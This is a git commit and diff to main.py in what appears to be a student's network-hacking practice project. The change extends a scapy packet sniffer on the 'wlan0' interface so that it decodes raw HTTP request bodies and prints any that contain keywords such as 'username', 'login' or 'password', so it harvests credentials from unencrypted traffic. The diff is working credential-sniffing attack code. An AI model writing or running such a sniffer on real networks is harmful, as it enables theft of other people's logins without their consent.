f8499161bd41b72a6cc8292444c0fee3bc43fa59
Shanto2378 <hasibul.shanto1@northsouth.edu>
2024-08-09 02:22:20 +0600

    read data like usrname & pass from HTTP website

--- main.py
+++ main.py
@@ -8,5 +8,17 @@ def sniff (interface):
 
 def process_sniffed_packet (packet):
     if packet.haslayer(http.HTTPRequest):
-        print(packet)
+        if packet.haslayer(scapy.Raw):
+            load = packet[scapy.Raw].load
+            try:
+                load = load.decode('utf-8') # have to decode the load before going to loop or else it will throw an error "a bytes-like object is required, not 'str''. It was closed."
+            except:
+                print("[+] Error handling the packet")
+
+            keywords = ["username", "user", "login", "password", "pass"]
+            for keyword in keywords:
+                if keyword in load:
+                    print("[+] Possible username/password: " + load)
+                    break
+                
 sniff("wlan0")
